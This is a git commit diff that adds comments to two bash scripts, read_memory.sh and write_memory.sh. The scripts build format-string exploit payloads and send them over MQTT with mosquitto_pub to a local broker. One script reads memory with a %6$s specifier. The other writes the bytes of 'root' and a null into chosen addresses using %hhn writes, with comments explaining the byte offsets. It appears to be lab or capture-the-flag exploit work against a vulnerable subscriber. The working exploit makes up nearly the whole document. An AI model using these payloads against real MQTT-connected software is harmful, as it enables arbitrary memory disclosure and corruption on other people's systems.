b26e8effe35a8d5f5013234ffea992af25abb17f
Bryan Pearson <peabryan95@gmail.com>
2022-04-21 10:35:43 -0400

    Add comments

--- read_memory.sh
+++ read_memory.sh
@@ -1,5 +1,7 @@
 #!/bin/bash
 
+# Make sure the supplied address is little-endian!
+
 command_prefix="mosquitto_pub -h 0.0.0.0 -t /topic/qos0 -m"
 
 newline=$(echo "0a0d" | xxd -p -r) # \r\n
@@ -7,6 +9,7 @@ newline=$(echo "0a0d" | xxd -p -r) # \r\n
 # Print the value at the address
 printer="$newline%6\$s$newline" 
 
+# User specified read address.
 address=$(echo $1 | xxd -p -r)
 
 payload=$address$printer
--- write_memory.sh
+++ write_memory.sh
@@ -1,20 +1,29 @@
 #!/bin/bash
 
+# Make sure the supplied address is little-endian!
+
 command_prefix="mosquitto_pub -h 0.0.0.0 -t /topic/qos0 -m"
 
+# The 3 most significant bytes of the supplied base address
 msb=$(echo -n $1 | tail -6c)
 
-write_r="%110x%6\$hhn"
-write_o="%107x%6\$hhn"
-write_t="%112x%6\$hhn"
-write_null="%252x%6\$hhn"
+write_r="%110x%6\$hhn" # 0x72 - 4 = 0x6e
+write_o="%107x%6\$hhn" # 0x6f - 4 = 0x6b
+write_t="%112x%6\$hhn" # 0x74 - 4 = 0x70
+write_null="%252x%6\$hhn" # 0x00 - 4 = 0xfc
 
+# Each loop adds $i to the least significant byte of our supplied address
 for i in {0..4}
 do
+    # Add $i to the least significant byte
     lsb=$(echo $1 | head -2c)
     lsb_decimal=$(printf "%d" $((16#$lsb+$i)))
     lsb_hex=$(printf "%.2x" $lsb_decimal)
+
+    # Combine the new least significant byte with the 3 most significant bytes
     address=$(echo $lsb_hex$msb | xxd -p -r)
+
+    # Format string parameter depends on which loop iteration we are on
     if [ $i -eq 0 ]; then
         inject=$write_r
     elif [ $i -eq 1 ] || [ $i -eq 2 ]; then
@@ -24,6 +33,8 @@ do
     else
         inject=$write_null
     fi
+
+    # Craft and send the payload
     payload=$address$inject
     $command_prefix "$payload"
 done
